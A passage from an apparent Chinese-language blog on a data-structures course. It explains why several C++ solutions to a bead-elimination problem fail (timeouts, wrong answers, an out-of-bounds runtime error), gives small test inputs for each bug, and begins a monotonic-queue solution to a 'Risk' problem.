punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这份代码在逻辑上是正确的, 但是由于采用数组实现, 时间复杂度正比于输入数据的规模. 因为数组的插入与删除操作复杂度为 $O(n)$, 那么当输入规模过大时, 会导致 <code>Time Limit Exceeded</code>.</p><ul><li>测例构造思路</li></ul><p>构造长度为 <code>500000</code> 的串 <code>a</code>, 并在串 <code>a</code> 的头部进行 <code>500000</code> 次插入操作, 导致超时.</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码 4"></a>代码 4</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">--</span>left<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">==</span> color<span class="token punctuation">)</span> <span class="token operator">++</span>right<span class="token punctuation">;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> right <span class="token operator">-</span> left<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&gt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        a<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> left <span class="token operator">&lt;</span> a<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">play</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数的实现事实上并未能访问 <code>a.at(0)</code> 的具体元素, 注意到 <code>left</code> 可被赋值为 <code>0</code>, 此时在 <code>erase</code> 操作中会删去 <code>a.at(0)</code> 位置的元素, 如果在此时进行了消除则会导致 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>BAC</code> 经第一次插入 <code>A</code> 后 <code>left = 0</code>, <code>right = 3</code>, 错误地在串头部发生消除, 串 <code>a</code> 变为 <code>C</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">BAC<span class="token number">1</span><span class="token number">1</span> A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码 5"></a>代码 5</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> m<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主函数在读取字符串 <code>a</code> 时使用了 <code>cin</code>, 因为 <code>cin</code> 并不能读取空串, 因此这种方式不具有鲁棒性. 这种情况下, 程序会将本属于 <code>m</code> 的值读入 <code>a</code>, 进而导致错误.</p><ul><li>测例构造思路</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cin <span class="token operator">&gt;&gt;</span> rank <span class="token operator">&gt;&gt;</span> color<span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> rank<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">play</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将输入串 <code>a</code> 置空, 程序会将本属于 <code>m</code> 的值 <code>2</code> 读入 <code>a</code>, 将值 <code>0</code> 读入 <code>m</code>, 此时循环会因 <code>m = 0</code> 被直接跳过执行 <code>cout &lt;&lt; a &lt;&lt; endl</code>, 产生 <code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> <span class="token number">2</span><span class="token number">0</span> A<span class="token number">0</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码 6"></a>代码 6</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Rank pos <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>rank<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>cur <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">get</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> succ_len <span class="token operator">=</span> plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> pos<span class="token punctuation">.</span>second<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>succ_len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memmove</span><span class="token punctuation">(</span>cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> cur<span class="token punctuation">,</span> succ_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>cur <span class="token operator">=</span> ch<span class="token punctuation">;</span>    alen<span class="token operator">++</span><span class="token punctuation">;</span>    plen<span class="token punctuation">[</span>pos<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在插入字符的时候并未考虑是否会超出数组大小, 直接执行 <code>memmove</code> 操作. 由于字符串采用二维数组 <code>p[1 &lt;&lt; 12][plen_bound]</code> 形式存储, 占用了一块连续的内存. 若一直进行插入操作而不发生消除, 那么在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>只需向字符串头部不停执行插入操作而不产生消除即可, 在单个数组到达最大容量后便会覆盖下个数组的内容, 进而导致输出串 <code>a</code> 时产生 <code>Wrong Answer</code>.</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码 7"></a>代码 7</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 计算需要消除的开区间 (l, r)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>            dis<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                    l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中处理左右两侧 <code>Rank</code> 时, 会对左右侧 <code>Rank</code> 进行移动. 当需要消除的字符不全处于同一数组中时, 会进行判断并将 <code>Rank</code> 移动指向不同的数组.</p><p>但是在移动左侧 <code>Rank l</code> 时使用 <code>if</code> 进行判断, 每移动一个字符的位置, <code>l</code> 最多改变一个数组的指向. 因此若存在类似 <code>CBA| |ABC</code> 的情况 (使用 “|” 分隔不同的数组), 向第三组头部插入字符 <code>A</code>, 经过一个 <code>if</code> 循环后, <code>l</code> 仅能移动到第二组而非第一组.</p><p>此时 <code>l.first = 2</code>, <code>l.second = -1</code>, 由于存储字符串使用二维数组的结构, 操作 <code>get(l)</code> 会访问到 <code>p[1][plen_bound - 1] = p[1][4095]</code>, 而非预期中的 <code>p[1][plen[1] - 1] = p[1][2]</code>, 进而导致错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入 <code>4099</code> 位的字符串 <code>a</code> 使得 <code>a</code> 能被存储入三个数组 <code>p[0]</code>、<code>p[1]</code>、<code>p[2]</code>, 然后通过一系列插入消除使得 <code>p[1]</code> 为空, 此时 <code>p[0]</code> 的末字符与 <code>p[2]</code> 的首字符均为 <code>B</code>. 最后向 <code>p[2]</code> 首部插入字符 <code>B</code>, 但是程序错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码 8"></a>代码 8</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span>second<span class="token operator">++</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>second <span class="token operator">&gt;=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">.</span>second <span class="token operator">-=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>            r<span class="token punctuation">.</span>first<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dis <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        eliminated <span class="token operator">+=</span> dis <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        lbound <span class="token operator">=</span> l<span class="token punctuation">;</span>        rbound <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在寻找相同字符这一部分缺失了其他代码所有的 <code>while(1)</code> 循环, 这导致在进行一次消除后无法进行同组内的连续消除, 进而产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>a</code> 为 <code>AABBA</code>, 向其中插入 <code>B</code> 后会先发生 <code>BBB</code> 的消除, 但无法进行 <code>AAA</code> 的连续消除, 输出 <code>AAA</code>, 产生<code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">AABBA<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码 9"></a>代码 9</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        alen <span class="token operator">-=</span> eliminated<span class="token punctuation">;</span>        l <span class="token operator">=</span> lbound<span class="token punctuation">;</span>        r <span class="token operator">=</span> rbound<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">.</span>second <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> len <span class="token operator">=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> r<span class="token punctuation">.</span>second<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>second<span class="token punctuation">]</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在执行消除过程中并未考虑特殊处理 <code>l.first = r.first</code> 的情形. 那么 <code>plen[l.first]</code> 被赋值为 <code>l.second + 1</code>, 接下来 <code>len = plen[r.first] - r.second = plen[l.first] - r.second</code> 为负值. 而 <code>plen[r.first]</code> 为 <code>size_t</code> 类型, 即 <code>unsigned long long</code> 类型, 从而在赋值 <code>plen[r.first] = len</code> 时会因下溢出而被赋为很大的正数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">p2a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> copied <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>copied<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        copied <span class="token operator">+=</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时对 <code>a[copied]</code> 进行 <code>memcpy</code> 时则会因为 <code>plen[i]</code> 过大而导致越界访问到 <code>p[i]</code> 长度之外的内存, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>只需构造一个在同一数组内发生一次消除, 产生 <code>l.first = r.first</code> 的情形. 此时会因为在 <code>memcpy(&amp;a[copied], p[0], plen[0])</code> 部分出现越界访问, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">ABBC<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码 10"></a>代码 10</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中消除结束后, 如果消除发生在不同的块中, 那么会将 <code>l.first</code> 所在块的长度错误地记为 <code>0</code>, 如果在后续操作中插入珠子的位置在此之后, 那么 <code>find()</code> 函数查找到的位置就会出错, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入充分长的串 <code>a</code> 使得 <code>a</code> 被存储在两个数组 <code>p[0]</code>, <code>p[1]</code> 中, 随后输出字符使得在 <code>p[0]</code>、<code>p[1]</code> 连接处产生消除, 程序将 <code>p[0]</code> 的长度错误地记为 <code>0</code>, 进而之后的插入会插入错误地位置, 直接关联到之后 <code>p2a()</code> 的过程, 产生 <code>Wrong Answer</code>.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Risk</title>
      <link href="/2022/10/17/risk/"/>
      <url>/2022/10/17/risk/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-1-Risk"><a href="#2-1-Risk" class="headerlink" title="2-1 Risk"></a>2-1 Risk</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题的思路是先求出由每一天回溯所得的最大单日确诊病例数, 然后使用前缀和算法处理得到的最大病例数数组, 最后对于每组给定的输入 <code>p</code>、<code>q</code>, 查询并输出相应的低、中风险天数.</p><p>使用数组 <code>x[i]</code> 储存每日的确诊人数, 数组 <code>m[i]</code> 储存对应的回溯天数. 实际上, 本题相当于用一个滑动窗口来扫描遍历 <code>x[i]</code> 数组, 并返回 <code>x[i - m[i]]</code> 到 <code>x[i - 1]</code> 这个窗口中的最大值.</p><p>注意到序列 <code>x[i - m[i]]</code> 是不减的, 那么窗口整体是向右移动的, 对于窗口内不同的两天 <code>i &lt; j</code>, 若经过一系列移动后 <code>i</code> 在窗口内, 那么 <code>j</code> 必然也在窗口内. 此时如果 <code>x[i] &lt;= x[j]</code>, 那么 <code>x[i]</code> 将不会对窗口中的最大值做出贡献.</p><p>这也就是说, 随着窗口右移加入新的确诊病例数, 窗口内不大于该数的数字在之后都不会成为窗口中的最大值 (它至少不大于这个新加入的确诊病例数). 也就是说, 我们可以直接删去窗口中不大于新加入确诊病例数的所有数.</p><p>构造单调队列这一数据结构, 队列中元素从队首到队尾降序排列. 对于每一次窗口扫描, 我们将窗口最右端新加入的元素与队尾元素比较, 若队尾元素不大于新入队元素, 则删去队尾元素, 最后将新元素入队. 如此操作, 保证了队列元素的单调性. 同时使用 <code>int</code> 数组与两个 <code>int</code> 类型整数 <code>header</code>、<code>trailer</code> 记录队列的首尾位置, 模拟单调队列的功能. 对于队列中的每个元素, 我们在入队的同时记录它的确诊病例数和它在原数组中的天数.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 8</span><span class="token keyword">class</span> <span class="token class-name">PriorityQueue</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 指向头部.</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 指向尾部.</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数在原数组中对应的天数.</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数的大小.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考虑到窗口的左端实际上是单调不减的, 因此在队尾元素出队后, 它不可能再次入队. 只需要查询队首元素, 如果它对应的位置不位于滑动窗口中, 则删去该元素, 最后剩下的满足条件的队首元素即是窗口中对应的最大确诊病例数. 我们使用 <code>cases[i]</code> 数组存储第 <code>i</code> 天回溯对应的最大确诊病例数. 然后遍历 <code>cases[i]</code>, 将为病例数大小 <code>k</code> 出现的天数记录在数组 <code>sum[k]</code> 中. 随后对 <code>sum</code> 数组从第二项开始求出前缀和, <code>sum[k - 1]</code> 即对应了 <code>cases</code> 数组中病例数位于 $[0, k)$ 